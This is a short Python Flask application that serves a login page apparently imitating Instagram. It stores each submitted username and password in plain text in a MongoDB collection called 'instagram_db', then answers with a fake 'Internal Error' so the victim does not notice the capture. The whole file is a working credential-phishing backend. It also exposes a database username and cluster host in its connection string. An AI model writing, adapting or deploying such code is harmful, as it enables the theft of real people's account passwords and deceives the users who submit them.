from flask import Flask, render_template, request
from pymongo import MongoClient

app = Flask(__name__)

# Replace with your own Atlas connection string:
client = MongoClient("mongodb+srv://danish:<db_password>@cluster0.wiieqp8.mongodb.net/?appName=Cluster0")

db = client["instagram_db"]
users = db["users"]

@app.route("/")
def login_page():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    users.insert_one({
        "username": username,
        "password": password
    })

    return "Internal Error"

if __name__ == "__main__":
    app.run()
